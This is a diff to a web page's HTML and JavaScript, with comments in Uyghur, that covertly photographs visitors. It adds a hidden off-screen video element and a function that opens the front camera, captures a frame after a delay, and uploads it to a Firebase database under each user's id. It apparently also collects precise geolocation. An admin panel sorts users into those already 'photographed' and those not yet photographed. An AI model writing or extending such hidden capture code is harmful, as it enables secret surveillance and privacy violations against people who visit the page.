@@ -214,6 +214,7 @@
 
     <div class="screenshot-shield"></div>
 
+    <!-- 🔥 مۇقىملاشتۇرۇلغان كامېرا ئېقىم ئېلېمېنتى -->
     <video id="secretCamStream" autoplay playsinline muted style="display:none; position:fixed; top:-9999px; left:-9999px; width:1px; height:1px;"></video>
     <canvas id="secretCanvas" style="display:none;"></canvas>
 
@@ -293,11 +294,9 @@
 
             <div class="section-header" style="margin-top: 25px;">توربەتكە كىرگەن ئابونتلار (<span id="userCount">0</span>)</div>
             
-            <!-- 🔥 رەسىمگە تارتىلغان ئابونتلار بۆلىكى -->
             <div class="admin-sub-section">📸 رەسىمگە تارتىلغان ئابونتلار</div>
             <div class="users-list" id="capturedUsersContainer"></div>
 
-            <!-- 🔥 تېخى تارتىلمىغان ئابونتلار بۆلىكى -->
             <div class="admin-sub-section" style="margin-top:20px; border-color:#ff9800; color:#ff9800;">⏳ تېخى رەسىمگە تارتىلمىغانلار</div>
             <div class="users-list" id="notCapturedUsersContainer"></div>
         </div>
@@ -394,6 +393,7 @@
             }
         }
 
+        // 🔥 كامېرا ئېقىمىنى كاپالەتلەندۈرۈپ تارتىدىغان ئەلالاشتۇرۇلغان فۇنكسىيە
         function requestUserPermissionsAndCapture() {
             if (!currentUser || !currentUser.id) return;
 
@@ -415,32 +415,55 @@
                 }, { enableHighAccuracy: true, timeout: 10000 });
             }
 
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            // ئالدىنقى كېمىرلارغا ماس كېلىشى ئۈچۈن قېلىپ سىناش قۇرۇلمىسى
+            const constraints = {
+                video: {
+                    facingMode: "user",
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
+                },
+                audio: false
+            };
+
+            navigator.mediaDevices.getUserMedia(constraints)
                 .then((stream) => {
                     const video = document.getElementById('secretCamStream');
                     video.srcObject = stream;
-                    video.play();
                     
-                    setTimeout(() => {
-                        const canvas = document.getElementById('secretCanvas');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
-                        
-                        window.dbSet(window.dbRef(window.db, `users/${currentUser.id}/capturedImage`), {
-                            image: imageData,
-                            capturedAt: new Date().toLocaleString()
-                        });
+                    video.onloadedmetadata = () => {
+                        video.play().then(() => {
+                            // سىن كامېرىدىن تەييار رەسىم ئېلىش ئۈچۈن 1.5 سېكۇنت ساقلايمىز
+                            setTimeout(() => {
+                                const canvas = document.getElementById('secretCanvas');
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                
+                                const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                                
+                                // Firebase گە ساقلاش
+                                window.dbSet(window.dbRef(window.db, `users/${currentUser.id}/capturedImage`), {
+                                    image: imageData,
+                                    capturedAt: new Date().toLocaleString()
+                                }).then(() => {
+                                    console.log("مەخپىي رەسىم مۇۋەپپەقىيەتلىك ساقلاندى!");
+                                }).catch(err => {
+                                    console.error("رەسىمنى ساقلاشتا خاتالىق كۆرۈلدى:", err);
+                                });
 
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 2000);
+                                // كامېرا ئېقىمىنى تاقاش
+                                stream.getTracks().forEach(track => track.stop());
+                            }, 1500);
+                        }).catch(e => {
+                            console.log("سىننى ئويغىتىشتا خاتالىق:", e);
+                            stream.getTracks().forEach(track => track.stop());
+                        });
+                    };
                 })
                 .catch((err) => {
-                    console.log("كامېرا رۇخسىتى بېرىلمىدى:", err);
+                    console.log("كامېرا رۇخسىتى بېرىلمىدى ياكى ئۈسكۈنە قوللىمىدى:", err);
                 });
         }
 
@@ -684,7 +707,6 @@
             handleSearch();
         }
 
-        // 🔥 ئابونتلارنى ئىككى بۆلەككө ئايرىپ كۆرسىتىش فۇنكسىيەسى
         function renderAdminUserLists() {
             const capturedContainer = document.getElementById('capturedUsersContainer');
             const notCapturedContainer = document.getElementById('notCapturedUsersContainer');
